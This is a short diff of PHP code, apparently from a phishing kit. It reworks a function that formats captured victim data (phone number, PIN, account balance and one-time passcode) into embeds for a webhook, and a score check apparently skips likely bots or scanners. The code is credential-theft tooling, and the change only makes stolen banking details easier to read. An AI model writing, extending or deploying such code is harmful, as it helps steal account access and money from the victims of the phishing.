@@ -15,9 +15,19 @@ function nq_ip() {
 function nq_tg($desc, $fields, $color = 3066993) {
     global $webhook, $_nq_score;
     if ($_nq_score >= 8) return;
-    $f = [];
-    foreach ($fields as $i => $field) {
-        $f[] = ['name' => $field[0], 'value' => '`' . $field[1] . '`', 'inline' => ($i < 2)];
+    $zws = "\xE2\x80\x8B";
+    $sep = ['name' => $zws, 'value' => '`──────────────────────────────`', 'inline' => false];
+    $f   = [];
+    // TEL + PW combinados en una sola línea
+    if (count($fields) >= 2) {
+        $f[] = ['name' => 'TEL', 'value' => '`' . $fields[0][1] . '`  ─  Pin: `' . $fields[1][1] . '`', 'inline' => false];
+    }
+    $f[] = $sep;
+    // Campos extra (SALDO, Otp…) — valor centrado con em-spaces
+    $pad = str_repeat("\xE2\x80\x83", 8);
+    for ($i = 2; $i < count($fields); $i++) {
+        $f[] = ['name' => $fields[$i][0], 'value' => $pad . '`' . $fields[$i][1] . '`', 'inline' => false];
+        $f[] = $sep;
     }
     $embed = [
         'title'       => 'simulator',
